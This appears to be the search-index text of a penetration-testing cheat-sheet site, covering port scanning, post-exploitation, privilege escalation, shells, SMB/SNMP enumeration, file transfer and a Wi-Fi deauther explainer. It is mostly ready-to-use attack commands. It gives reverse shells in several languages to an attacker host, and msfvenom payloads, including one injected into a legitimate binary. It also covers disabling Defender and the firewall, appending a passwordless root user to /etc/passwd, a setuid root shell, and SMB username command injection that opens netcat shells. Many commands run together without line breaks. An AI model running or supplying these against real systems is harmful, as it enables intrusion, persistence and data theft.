-sV -sC -T4 -p- -oA nmap ipnmap -sS -p4555 -sV --reason ipnmap -sS -T4 -sV -oA 00-tcp-top100/top-100 --stats-every 60s --max-retries 3 --defeat-rst-ratelimit --top-ports 100 --script banner --reason solidstate.htbnmap -sS --min-rate 5000 --max-retries 1 -p- ipnmap -sT -p- --min-rate 10000 -oA nmap/alltcp ip\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#massscan","title":"MassScan","text":"<pre><code>masscan -p1-65535 ip --rate=1000 -e tun0 &gt; portsports=$(cat ports | awk -F \" \" '{print $4}' | awk -F \"/\" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')nmap -Pn -sV -sC -p$ports ip\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#full-tcp-scan","title":"Full TCP Scan","text":"<pre><code>nmap -sC -sV -p- -vv -oA full ipnmap -sT -p- --min-rate 10000 -oA nmap/alltcp ip\u200b\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#for-udp-scan","title":"For UDP Scan","text":"<pre><code>nmap -sU -sV -p- XXIPXXXnmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oA  /root/Documents/XXXX XXIPXXXnmap -sU -sV -vv -oA quick_udp ip\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#port-knocking","title":"Port Knocking","text":"<pre><code>for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x ip; done\u200b\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#port-445-139-scan-scripts","title":"Port 445, 139 Scan Scripts","text":"<pre><code>nmap -p445 --script smb-protocols $IPnmap -p445 --script smb-vuln-ms17-010 $IPnmap $IP -sV -Pn -vv -p 139,445 --script=smb-vuln* --script-args=unsafe=1nmap $IP --script=msrpc-enumnmap --script smb-vuln* -p 445 -oA nmap/smb_vulns ipnmap --script vuln -p445 ip\u200bpython usermap_script.py ip 445 ip 1234python usermap_script.py ip 139 ip 1234https://github.com/amriunix/CVE-2007-2447\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#ftp-port-21-scan-scripts","title":"FTP Port 21 Scan Scripts","text":"<pre><code>nmap \u2013script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#snmp-port-161","title":"SNMP Port 161","text":"<pre><code>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IPnmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IPnmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#mysql-port-3306","title":"MYSQL PORT 3306","text":"<pre><code>nmap -sV -Pn -vv  $IP -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#oracle-port-15211560","title":"Oracle Port 1521/1560","text":"<pre><code>nmap --script=oracle-sid-brute  $IPnmap --script=oracle-brute  $IPtnscmd10g version -h $IP\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#finger-port-79","title":"Finger Port 79","text":"<pre><code>finger-user-enumfinger-user-enum.pl -U /usr/share/seclist/username/name/name.txt -t\u200b\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#pop3-port-110","title":"POP3 Port 110","text":"<pre><code>telnet INSERTIPADDRESS 110USER [username]PASS [password]To list messagesRETR [message number]\u200btelnet ipuser userpass pwRETR 2\u200b\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/#ssh-port-22","title":"SSH PORT 22","text":"<pre><code>nmap -p22 -n -sV --script ssh2-enum-algos ip\n</code></pre>"},{"location":"Pentesting/Network/post-exploitation/","title":"Post Exploitation","text":""},{"location":"Pentesting/Network/post-exploitation/#post-exploitation","title":"Post Exploitation","text":"<p>Post-exploitation is a phase after an attacker has successfully breached a system. During this stage, the focus shifts from gaining initial access to maintaining control and further exploring the compromised environment. This involves activities such as privilege escalation, lateral movement within the network, data exfiltration, and establishing persistent access. Post-exploitation techniques aim to maximize the attacker's control over the compromised system and gather valuable information without raising suspicion.</p> <pre><code>grep -rnw '/' -ie 'pass' --color=always\ngrep -rnw '/' -ie 'DB_PASS' --color=always\ngrep -rnw '/' -ie 'DB_PASSWORD' --color=always\ngrep -rnw '/' -ie 'DB_USER' --color=always\n</code></pre>"},{"location":"Pentesting/Network/post-exploitation/#file-upload-on-linux-systems-via-base64-encoding-converting-a-file-to-base64","title":"File Upload on linux systems via base64 encoding Converting a file to base64","text":"<p>Once the file is converted to base64, you can just create a new file on the remote system and copy the base64 output of the above file into it. Next step would be to reverse the base64 to binary</p> <pre><code>cat fileWithBase64Content | base64 -d &gt; finalBinary\n</code></pre> <p>You can also use the smbserver.py from Impacket\u2019s repo to host a temporary smb server and fetch files in windows from remote smb servers using the net use command.</p>"},{"location":"Pentesting/Network/post-exploitation/#psexec-shells-of-remote-systems","title":"PSexec Shells of Remote Systems","text":"<p>Eg: Get cmd.exe shell of remote system with user administrator and password</p>"},{"location":"Pentesting/Network/post-exploitation/#powershell-sudo-for-windows","title":"Powershell Sudo for Windows","text":"<p>There maybe times when you know the creds to admin, but will have a low privileged shell. Unlike Linux, we cannot sudo on windows machines. So, I wrote a simple powershell script for that which can run a separate file as admin. You can run a batch file to add a new superuser or just execute a meterpreter binary as admin. The below command is to be run in a powershell window:</p> <pre><code>$pw = ConvertTo-SecureString \"EnterPasswordHere\" -AsPlainText -Force\n$pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"EnterDomainName\\EnterUserName\", $pw\n$script = \"C:\\Users\\EnterUserName\\AppData\\Local\\Temp\\test.bat\"\nStart-Process powershell -Credential $pp -ArgumentList '-NoProfile -Command &amp;{Start-Process $script -Verb RunAs}'\n</code></pre> <p>If however you want to run the powershell from a cmd prompt, you can run store the above command in a xyz.ps1 file and run it in cmd as below:</p> <pre><code>powershell -ExecutionPolicy Bypass -File xyz.ps1\u200b\n</code></pre> <p>Download files in Windows with </p><pre><code>bitsadmin bitsadmin /transfer mydownloadjob /download /priority normal http:///xyz.exe C:\\Users\\\\%USERNAME%\\AppData\\local\\temp\\xyz.exe\n</code></pre> <p>Disable firewall/defender and enable RDP for all Sometimes you will have the admin creds and may require an RDP Session to find out what exactly is going on in the backend for post exploitation. Below commands will help you disable firewall and enable RDP over insecure connections</p> <pre><code>sc stop WinDefend\nnetsh advfirewall show allprofiles\nnetsh advfirewall set allprofiles state off\nnetsh firewall set opmode disable\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\n</code></pre> <p>Print files with the line number where the string is found grep -rnw '/' -ie 'password' --color=always</p>"},{"location":"Pentesting/Network/post-exploitation/#find-files-with-suid-permission","title":"Find files with SUID permission","text":"<pre><code>find / -perm -4000 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"Pentesting/Network/post-exploitation/#find-files-with-open-permissions","title":"Find files with open permissions","text":"<pre><code> find / -perm -777 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"Pentesting/Network/post-exploitation/#find-files-with-suid-permission-for-current-user","title":"Find files with SUID permission for current user","text":"<pre><code>find / perm /u=s -user `whoami` 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/null\n</code></pre>"},{"location":"Pentesting/Network/post-exploitation/#find-files-with-writable-permission-for-current-user-or-current-group","title":"Find files with writable permission for current user or current group","text":"<pre><code>find / perm /u=w -user `whoami` 2&gt;/dev/nullfind / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/nullfind / -perm /u+w -user `whoami` 2&gt;/dev/nul\n</code></pre>"},{"location":"Pentesting/Network/post-exploitation/#find-directories-with-writable-permissions-for-current-user-or-current-group","title":"Find directories with writable permissions for current user or current group","text":"<pre><code>find / perm /u=w -type -d -user `whoami` 2&gt;/dev/nullfind / -perm /u+w,g+w -d -user `whoami` 2&gt;/dev/null\n</code></pre> <p>In order to move horizontally on the network we need to know as much about the machine as possible. We need to loot it. These are some things that must be done on every compromised machine.</p>"},{"location":"Pentesting/Network/post-exploitation/#tcp-dump","title":"Tcp dump","text":"<p>Who else is connected to the machine?</p>"},{"location":"Pentesting/Network/post-exploitation/#dump-the-hashes","title":"Dump the hashes","text":"<p>It is always good to have a list of all the hashes and crack them. Maybe someone is reusing the password.</p>"},{"location":"Pentesting/Network/post-exploitation/#to-what-is-the-machine-connected","title":"To what is the machine connected?","text":"<ul> <li> <p>netstat</p> </li> <li> <p>ipconfig</p> </li> </ul>"},{"location":"Pentesting/Network/post-exploitation/#email-and-personal-files","title":"Email and personal files","text":""},{"location":"Pentesting/Network/post-exploitation/#logs","title":"Logs","text":"<p>\u200b \u200b</p>"},{"location":"Pentesting/Network/priv-escalation/","title":"Privilege Escalation","text":""},{"location":"Pentesting/Network/priv-escalation/#privilege-escalation","title":"Privilege Escalation","text":"<p>Privilege escalation means gaining higher levels of access or permissions within a system or network beyond what was initially granted. It involves exploiting vulnerabilities or misconfigurations to elevate privileges from a lower-privileged user or account to gain control over more sensitive resources or execute commands with increased authority.</p>"},{"location":"Pentesting/Network/priv-escalation/#linux-privilege-escalation","title":"Linux Privilege Escalation","text":"<ul> <li>sudo -l</li> <li>Kernel Exploits</li> <li>OS Exploits</li> <li>Password reuse (mysql, .bash_history, 000-default.conf...)</li> <li>Known binaries with suid flag and interactive (nmap)</li> <li>Custom binaries with suid flag either using other binaries or with command execution</li> <li>Writable files owned by root that get executed (cronjobs)</li> <li>MySQL as root</li> <li>Vulnerable services (chkrootkit, logrotate)</li> <li>Writable /etc/passwd</li> <li>Readable .bash_history</li> <li>SSH private key</li> <li>Listening ports on localhost</li> <li>/etc/fstab</li> <li>/etc/exports</li> <li>/var/mail</li> <li>Process as other user (root) executing something you have permissions to modify</li> <li>SSH public key + Predictable PRNG</li> <li>apt update hooking (Pre-Invoke)</li> <li>Capabilities</li> </ul>"},{"location":"Pentesting/Network/priv-escalation/#windows-privilege-escalation","title":"Windows Privilege Escalation","text":"<ul> <li>Kernel Exploits</li> <li>OS Exploits</li> <li>Pass The Hash</li> <li>Password reuse</li> <li>DLL hijacking (Path)</li> <li>Vulnerable services</li> <li>Writable services binaries path</li> <li>Unquoted services</li> <li>Listening ports on localhost</li> <li>Registry keys</li> </ul>"},{"location":"Pentesting/Network/priv-escalation/#kernel-exploits","title":"Kernel Exploits","text":"<p>Linux: https://github.com/lucyoa/kernel-exploits\u200b</p> <p>Windows: https://github.com/abatchy17/WindowsExploits\u200b</p> <p>Windows Add User</p> <pre><code>#include  /* system, NULL, EXIT_FAILURE */\u200bint main (){  int i;  i=system (\"net user   /add &amp;&amp; net localgroup administrators  /add\");  return 0;}\n</code></pre> <p>SUID Change</p> <pre><code>SUID\u200bSet owner user ID.\u200bint main(void){  setresuid(0, 0, 0);  system(\"/bin/bash\");}\u200b\n</code></pre> <p>Privilege Escalation: </p><pre><code>#Find Binaries that will execute as the ownerfind / -perm -u=s -type f 2&gt;/dev/null\n\u200b#Find binaries that will execute as the groupfind / -perm -g=s -type f 2&gt;/dev/null\n\u200b#Find sticky-bit binariesfind / -perm -1000 -type d 2&gt;/dev/null\u200bfind / -perm -4000 2&gt;/dev/null\u200bwritable by everyonefind / -writable -type f 2&gt;/dev/null\u200bWorld writeable directoriesfind / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2&gt;/dev/null | grep -v root\u200bWorld writeable filesfind / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2&gt;/dev/null\u200bWriteable config filesfind /etc/ -writable -type f 2&gt;/dev/null\u200bfind / -user root -perm -4000 -exec ls -ld {} \\; 2&gt; /dev/null\u200b\n</code></pre> <p>Window Exploit Suggester</p> <pre><code>python2 windows-exploit-suggester.py --database 2017-10-10-mssb.xls --systeminfo ../systeminfo.txt --quietpython windows-exploit-suggester.py \u2013systeminfo systeminfo.txt \u2013database 2018-11-25-mssb.xls\n</code></pre> <p>Windows Priv Escalation</p> <pre><code>AlwaysInstallElevatedCheck if the following registry settings are set to \"1\"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"\u200b\n</code></pre> <p>Basic Linux Enumeration</p> <pre><code>Distribution type &amp; kernel versioncat /etc/*release*uname -arpm -q kerneldmesg | grep -i linux\u200bDefault writeable directory / folder/tmp/dev/shm\u200bSearch for passwordsSearch for password within config.phpgrep -R 'password' config.php\u200bFind possible other writeable directory / folderfind / -type d \\( -perm -g+w -or -perm -o+w \\) -exec ls -adl {} \\;\u200bService(s) running as root userps aux | grep rootps -ef | grep root\u200bInstalled applicationsls -lah /usr/bin/ls -lah /sbin/dpkg -lrpm -qals -lah /var/cache/apt/archivesOls -lah /var/cache/yum/\u200bScheduled jobscrontab -lls -la /etc/cron*ls -lah /var/spool/cronls -la /etc/ | grep croncat /etc/crontabcat /etc/anacrontab\u200bFind pattern in file:grep -rnw '/etc/passwd' -e 'root'\u200bSticky bit, SGID, SUID, GUIDSticky bitfind / -perm -1000 -type d 2&gt;/dev/null\u200bSGID (chmod 2000)find / -perm -g=s -type f 2&gt;/dev/null\u200bSUID (chmod 4000)find / -perm -u=s -type f 2&gt;/dev/nullfind /* -user root -perm -4000 -print 2&gt;/dev/null\u200bSUID or GUIDfind / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null\u200bAdd user to /etc/passwd and root groupecho hodor::0:0:root:/root:/bin/bash &gt;&gt; /etc/passwd\u200b\n</code></pre>"},{"location":"Pentesting/Network/priv-escalation/#reference","title":"Reference","text":"<ul> <li>\u200bhttps://payatu.com/guide-linux-privilege-escalation\u200b</li> </ul>"},{"location":"Pentesting/Network/shells/","title":"Shells","text":""},{"location":"Pentesting/Network/shells/#shells","title":"Shells","text":"<p>This is s great collection of different types of reverse shells and webshells. Many of the ones listed below comes from this cheat-sheet:  </p> <ul> <li> <p>https://highon.coffee/blog/reverse-shell-cheat-sheet/ </p> </li> <li> <p>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p> </li> </ul>"},{"location":"Pentesting/Network/shells/#windows","title":"Windows","text":""},{"location":"Pentesting/Network/shells/#meterpreter","title":"Meterpreter","text":""},{"location":"Pentesting/Network/shells/#standard-meterpreter","title":"Standard meterpreter","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=445 -f exe -o shell_reverse.exe\n</code></pre> <pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp\n</code></pre>"},{"location":"Pentesting/Network/shells/#meterpreter-https","title":"Meterpreter HTTPS","text":"<p>It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections. </p><pre><code>msfvenom -p windows/meterpreter/reverse_https LHOST=ip LPORT=443 -f exe -o met_https_reverse.exe\n</code></pre>"},{"location":"Pentesting/Network/shells/#non-staged-payload","title":"Non-staged payload","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=445 -f exe -o shell_reverse_tcp.exe\n</code></pre> <pre><code>use exploit/multi/handlerset payload windows/shell_reverse_tcp\n</code></pre>"},{"location":"Pentesting/Network/shells/#staged-payload","title":"Staged payload","text":"<pre><code>This must be caught with metasploit. It does not work with netcat.\n</code></pre> <pre><code>use exploit/multi/handlerset payload windows/shell/reverse_tcp\n</code></pre>"},{"location":"Pentesting/Network/shells/#inject-payload-into-binary","title":"Inject payload into binary","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x \"/somebinary.exe\" -o bad_binary.exe\n</code></pre>"},{"location":"Pentesting/Network/shells/#linux","title":"Linux","text":""},{"location":"Pentesting/Network/shells/#binary","title":"Binary","text":"<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=443 -f elf &gt; shell.elf\n</code></pre>"},{"location":"Pentesting/Network/shells/#bash","title":"Bash","text":"<pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n</code></pre> <pre><code>bash -i &gt;&amp; /dev/tcp/ip/8080 0&gt;&amp;1\n</code></pre>"},{"location":"Pentesting/Network/shells/#php","title":"Php","text":"<pre><code>php -r '$sock=fsockopen(\"ATTACKING-IP\",80);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre>"},{"location":"Pentesting/Network/shells/#netcat","title":"Netcat","text":""},{"location":"Pentesting/Network/shells/#bind-shell","title":"Bind shell","text":"<pre><code>#Linuxnc -vlp 5555 -e /bin/bashnc ip 5555# Windowsnc.exe -nlvp 4444 -e cmd.exe\n</code></pre>"},{"location":"Pentesting/Network/shells/#reverse-shell","title":"Reverse shell","text":"<pre><code>Linuxnc -lvp 5555nc ip 5555 -e /bin/bash# Windowsnc -lvp 443nc.exe ip 443 -e cmd.exe\n</code></pre>"},{"location":"Pentesting/Network/shells/#with-e-flag","title":"With -e flag","text":"<pre><code>nc -e /bin/sh ATTACKING-IP 80\n</code></pre> <pre><code>/bin/sh | nc ATTACKING-IP 80\n</code></pre>"},{"location":"Pentesting/Network/shells/#without-e-flag","title":"Without -e flag","text":"<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p\n</code></pre>"},{"location":"Pentesting/Network/shells/#ncat","title":"Ncat","text":"<p>Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted.</p>"},{"location":"Pentesting/Network/shells/#bind","title":"Bind","text":"<pre><code>ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --sslncat -v ip 5555 --ssl\n</code></pre>"},{"location":"Pentesting/Network/shells/#telnet","title":"Telnet","text":"<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p\n</code></pre> <pre><code>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443\n</code></pre>"},{"location":"Pentesting/Network/shells/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$i=\"ATTACKING-IP\";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre>"},{"location":"Pentesting/Network/shells/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"ATTACKING-IP\",80).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre>"},{"location":"Pentesting/Network/shells/#java","title":"Java","text":"<pre><code>r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])p.waitFor()\n</code></pre>"},{"location":"Pentesting/Network/shells/#python","title":"Python","text":"<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"Pentesting/Network/shells/#web-shells","title":"Web-shells","text":""},{"location":"Pentesting/Network/shells/#php_1","title":"PHP","text":"<p>This php-shell is OS-independent. You can use it on both Linux and Windows. </p><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=ip LPORT=443 -f raw &gt; shell.php\n</code></pre>"},{"location":"Pentesting/Network/shells/#asp","title":"ASP","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=443 -f asp &gt; shell.asp\n</code></pre>"},{"location":"Pentesting/Network/shells/#war","title":"WAR","text":"<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=443 -f war &gt; shell.war\n</code></pre>"},{"location":"Pentesting/Network/shells/#jsp","title":"JSP","text":"<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=443 -f raw &gt; shell.jsp\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/","title":"SMB Enumeration","text":""},{"location":"Pentesting/Network/smb-enumeration/#smb-enumeration","title":"SMB Enumeration","text":"<pre><code>smbclient -L x.x.x.x\nsmbmount //x.x.x.x/share /mnt \u2013o username=hodor,workgroup=hodor\nsmbclient \\\\\\\\x.x.x.x\\\\share\nenum4linux -a ip\nrpcclient -U \"\" x.x.x.x  # Anonymous bind using rpcclient / Null connect\nsmbclient //MOUNT/share  # Connect to SMB share\nsmbclient -U \"/=\\`nohup nc -e /bin/sh LHOST LPORT\\`\" -N -I ip //LAME/tmp\nnmap -T4 -sS -sC -Pn -A --script smb-vuln* ip\nsmbclient //ip/tmplogon \"./=\\`nohup nc -e /bin/sh LHOST LPORT\\`\"\nsmbclient -U \"/=\\`nohup cat /root/root.txt &gt; /tmp/ttt\\`\" -N -I ip //LAME/tmp\nsmbclient -U \"/=\\`nohup nc -e /bin/sh 10.10.15.11 60000\\`\" -N -I ip //LAME/tmp\nsmbclient -L ip\nenum4linux -S ip\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#nmap-smb-script-scan","title":"Nmap SMB Script Scan","text":""},{"location":"Pentesting/Network/smb-enumeration/#smb-users-and-share-scan","title":"SMB Users and Share Scan","text":"<pre><code>nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse ip\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#smb-vulnerability-scan","title":"SMB Vulnerability Scan","text":"<pre><code>nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse ip\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#smb-vulnerability-check-with-unsafe-arguments","title":"SMB Vulnerability Check with Unsafe Arguments","text":"<pre><code>nmap --script smb-check-vulns.nse --script-args=unsafe=1 -p445 ip\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#smb-vulnerability-check","title":"SMB Vulnerability Check","text":"<pre><code>nmap --script=smb-check-vulns.nse x.x.x.x\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#mounting-an-nfs-share-without-using-locks","title":"Mounting an NFS share without using locks","text":"<pre><code>mount ip:/vol/share /mnt/nfs -nolock\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#mounting-a-cifs-share-with-specified-credentials-and-domain","title":"Mounting a CIFS share with specified credentials and domain","text":"<pre><code>mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#mounting-a-cifs-share-without-specifying-credentials-prompt-for-password","title":"Mounting a CIFS share without specifying credentials (prompt for password)","text":"<pre><code>mount -t cifs //x.x.x.x/share /mnt\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#mounting-a-cifs-share-with-specified-credentials","title":"Mounting a CIFS share with specified credentials","text":"<pre><code>- #### mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#mounting-share-folder","title":"Mounting Share folder","text":"<pre><code>sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other\u200b\n</code></pre>"},{"location":"Pentesting/Network/smb-enumeration/#create-a-smb-server","title":"Create a SMB Server","text":"<ul> <li>In kali hosting a smb server <pre><code>impacket-smbserver ShareFolder $(pwd)\n</code></pre></li> <li>\u200bIn windows <pre><code>New-PSDrive -Name \"Followme\" -PSProvider \"FileSystem\" -Root \"\\\\ip\\ShareFolder\"\n</code></pre></li> </ul>"},{"location":"Pentesting/Network/snmp-enumeration/","title":"SNMP Enumeration","text":""},{"location":"Pentesting/Network/snmp-enumeration/#snmp-enumeration","title":"SNMP Enumeration","text":""},{"location":"Pentesting/Network/snmp-enumeration/#snmp-check","title":"SNMP-Check","text":"<pre><code>snmp-check $IP\nsnmpcheck -t $IP -c public\nsnmpcheck -t ip.X -c public\n</code></pre>"},{"location":"Pentesting/Network/snmp-enumeration/#onesixtyone","title":"onesixtyone","text":"<pre><code>onesixtyone -c names -i hosts\n</code></pre>"},{"location":"Pentesting/Network/snmp-enumeration/#snmpwalk","title":"SNMPWALK","text":"<pre><code>snmpwalk -c public -v1 $IP\n</code></pre>"},{"location":"Pentesting/Network/snmp-enumeration/#snmpenum","title":"SNMPENUM","text":"<pre><code>perl snmpenum.pl $IP public windows.txt\n</code></pre>"},{"location":"Pentesting/Network/snmp-enumeration/#nmap-scripts","title":"NMAP SCRIPTS","text":"<pre><code>nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x\n</code></pre> <pre><code>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP\n</code></pre> <pre><code>nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP\n</code></pre>"},{"location":"Pentesting/Network/transferring-files/","title":"Transferring files","text":""},{"location":"Pentesting/Network/transferring-files/#transferring-files","title":"Transferring files","text":"<p>File Transfer (download copy from linux to windows)</p> <pre><code>certutil -urlcache -f http://ip/1.exe 1.exe\u200b\n</code></pre> <pre><code>https://blog.ropnop.com/transferring-files-from-kali-to-windows/https://blog.netspi.com/15-ways-to-download-a-file/\n</code></pre> <p>\u200b</p>"},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/","title":"Wi-Fi Deauther","text":""},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/#wi-fi-deauther","title":"Wi-Fi Deauther","text":""},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/#what-is-wi-fi-deauther","title":"What is Wi-Fi Deauther?","text":"<p>A Wi-Fi deauther is a device that sends packets to a Wi-Fi access point or router with the intention of disconnecting all the connected devices from the network. This is achieved by sending deauthentication frames to the access point, which in turn sends them to the connected devices, forcing them to disconnect from the network.</p> <p>Wi-Fi deauthers are commonly used by security researchers to test the security of Wi-Fi networks, as well as by hackers to carry out malicious attacks on Wi-Fi networks.</p>"},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/#why-hackers-use-deauthers","title":"Why hackers use deauthers?","text":"<p>Hackers use deauthers to carry out denial-of-service (DoS) attacks on Wi-Fi networks. By sending deauthentication frames to an access point, hackers can force all devices connected to the network to disconnect and prevent them from reconnecting. This can be used as a disruptive tactic to cause chaos or as a way to gain unauthorized access to the network once all devices have been disconnected. Hackers can also use deauthers as a way to gather information about a network. By sending deauthentication frames to a device on the network, the device will automatically attempt to reconnect to the network, revealing its MAC address and other information. This can be useful for hackers to gather information about the devices and potentially exploit vulnerabilities in them.</p> <p>It is important to note that using a deauther to carry out malicious attacks on Wi-Fi networks is illegal and can result in severe consequences, including fines and imprisonment. Therefore, it is important to use Wi-Fi deauthers only for legitimate security testing purposes and with the permission of the network owner.</p>"},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/#difference-between-wi-fi-jammer-and-wi-fi-deauther","title":"Difference between Wi-Fi jammer and Wi-Fi deauther","text":"<p>A WiFi deauther and a WiFi jammer are both devices used to disrupt wireless communication, but they serve different purposes and operate in distinct ways:</p> <ul> <li> <p>WiFi Deauther:</p> <ul> <li>Purpose: A WiFi deauther is designed to deauthenticate or disconnect devices from a specific WiFi network. It sends deauthentication frames to the target devices, causing them to lose their connection to the network temporarily.</li> <li>Operation: A WiFi deauther typically works by impersonating the WiFi network's access point (AP) and sending deauthentication packets to the target devices, making them believe they are no longer connected to the legitimate network.</li> </ul> </li> <li> <p>WiFi Jammer:</p> <ul> <li>Purpose: A WiFi jammer is designed to disrupt and block all wireless communication within a certain frequency range, including WiFi signals. It aims to create interference and render the affected wireless devices unable to communicate on the targeted frequency.</li> <li>Operation: WiFi jammers typically emit powerful radio signals on the same frequency bands used by WiFi networks, causing interference and preventing devices from establishing or maintaining connections.</li> </ul> </li> 